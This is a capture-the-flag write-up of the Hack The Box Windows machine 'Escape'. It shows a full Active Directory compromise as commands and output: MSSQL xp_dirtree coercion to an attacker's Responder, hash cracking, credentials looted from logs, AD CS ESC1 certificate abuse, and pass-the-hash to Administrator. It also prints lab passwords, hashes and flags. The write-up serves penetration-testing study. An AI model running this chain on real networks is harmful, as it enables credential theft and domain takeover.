# 🧑‍💻 Hack The Box – Escape

## 📌 Overview
- **Machine Name:** Escape
- **IP Address(es):** 10.10.11.202
- **Difficulty:** Medium
- **OS:** Windows
- **Tags:** SMB / MSSQL / NTLM Capture / AD CS (ESC1) / Pass-the-Hash
- **Date Completed:** 2025.08.30
- **Status:** ✅ User | ✅ Root

---

## 🖥️ Initial Recon
### Nmap
```zsh
nmap -sC -sV -oA nmap/escape 10.10.11.202
```
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows SMB
464/tcp  open  kpasswd5      Kerberos kpasswd
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp  open  ssl/ldap      Microsoft Windows AD LDAP over SSL
1433/tcp open  ms-sql-s      Microsoft SQL Server
3268/tcp open  ldap          Microsoft AD Global Catalog
3269/tcp open  ssl/ldap      Microsoft AD Global Catalog (SSL)
Service Info: Host: DC; OS: Windows; Domain: sequel.htb
```
**Findings:**
- AD services present; domain appears to be **sequel.htb**.
- **MSSQL (1433)** is exposed.
- **SMB** accessible; worth anonymous share check.

---

## 📂 SMB
```zsh
nxc smb 10.10.11.202 -u 'a' -p '' --shares
```
```
[*] Enumerated shares
Public → READ
IPC$, NETLOGON, SYSVOL → READ
```
- Discovered **SQL Server Procedures.pdf** in `Public/` describing a temporary SQL account.

```zsh
SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022
```

---

## 🗄️ MSSQL → NTLM Capture
Use the public SQL creds to reach MSSQL, then coerce authentication to our Responder.
```zsh
impacket-mssqlclient sequel.htb/PublicUser:'GuestUserCantWrite1'@DC.sequel.htb
Responder -I tun0
EXEC xp_dirtree '\\10.10.14.12\\pwnd'
```
**Captured NetNTLMv2:**
```
sql_svc::sequel:2f35d9d9e832ed20:2FC4FDA068BD5E60E027B6A2D2DC7DFE:...
```
Crack with rockyou:
```zsh
hashcat sql_svc.hash --wordlist /usr/share/wordlists/rockyou.txt
```
Recovered:
```
sql_svc:REGGIE1234ronnie
```

---

## 🧭 BloodHound (Phase 1)
Collect domain data with the new account.
```zsh
bloodhound-ce-python -d sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' -c all -gc 10.10.11.202
```
**Notes:**
- `sql_svc` has no direct paths to DA.
- Focus shifts to host loot and logs for cred reuse.

---

## 🔎 Host Enumeration
As `sql_svc`, enumerate SQL-related dirs and logs:
- `C:\SQLServer\`
- `C:\SQLServer\Logs\ERRORLOG.BAK`

Found likely mistyped credential pair in logs:
```
... Logon failed for user 'sequel.htb\Ryan.Cooper' ...
... Logon failed for user 'NuclearMosquito3' ...
```

Validate:
```zsh
nxc smb sequel.htb -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```
```
[+] sequel.htb\Ryan.Cooper:NuclearMosquito3
```

---

## 🔑 Foothold – Ryan.Cooper
Obtain a user shell and flag.
```zsh
evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```
```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
ad38640e732f897285aa7ae70d8013fd
```
*Result:* **User shell obtained.**

---

## 🧭 BloodHound (Phase 2)
- **Ryan.Cooper →** member of **Certificate Service DCOM Access** (can talk to CA).
- Enterprise CA **`sequel-DC-CA`** deployed.
- Review AD CS templates for abuse.

Hunt vulnerable templates (ESC1):
```zsh
certipy find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -target-ip 10.10.11.202 -vulnerable -stdout -enable
```
Key finding:
```
ESC1: 'SEQUEL.HTB\Domain Users' can enroll; enrollee supplies subject; template allows client authentication
```

---

## 🚀 Privilege Escalation – AD CS ESC1
Request a certificate for **Administrator** with user-supplied UPN:
```zsh
certipy req -dc-ip 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' \
  -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn Administrator@sequel.htb -debug
```
Output:
```
[*] Saved certificate and private key to 'administrator.pfx'
```

Convert cert to NT hash (authenticate via PKINIT):
```zsh
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
```
```
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Pass-the-Hash for admin shell:
```zsh
evil-winrm -i 10.10.11.202 -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b04f3f6921caecfabba76e94cd13da28
```
*Result:* **Full domain compromise.**

---

## 🏁 Flags
- **User.txt:** `ad38640e732f897285aa7ae70d8013fd`
- **Root.txt:** `b04f3f6921caecfabba76e94cd13da28`

---

## 🧠 Lessons Learned

**Technical**
- MSSQL `xp_dirtree` → NTLM capture remains a reliable foothold path.
- Host log archaeology (e.g., `ERRORLOG.BAK`) can leak valid creds.
- AD CS **ESC1** (enrollee supplies subject + client auth) enables UPN impersonation to **Administrator**.
- Certificates → PKINIT → NT hash → PTH is a clean, detection-friendly chain.

**Personal**
- Always loot application logs; admins leak creds more than they think.
- When BloodHound shows no paths, pivot to service-specific abuse (MSSQL, AD CS).
- Keep Responder ready; coercion primitives pop up in surprising places.

**Reusable Techniques**
- SMB share recon → doc-based credential discovery.
- MSSQL coercion (`xp_dirtree`) → NetNTLMv2 capture → hashcat.
- AD CS hunting with `certipy find` → **ESC1** abuse → `certipy auth` → PTH to Admin.
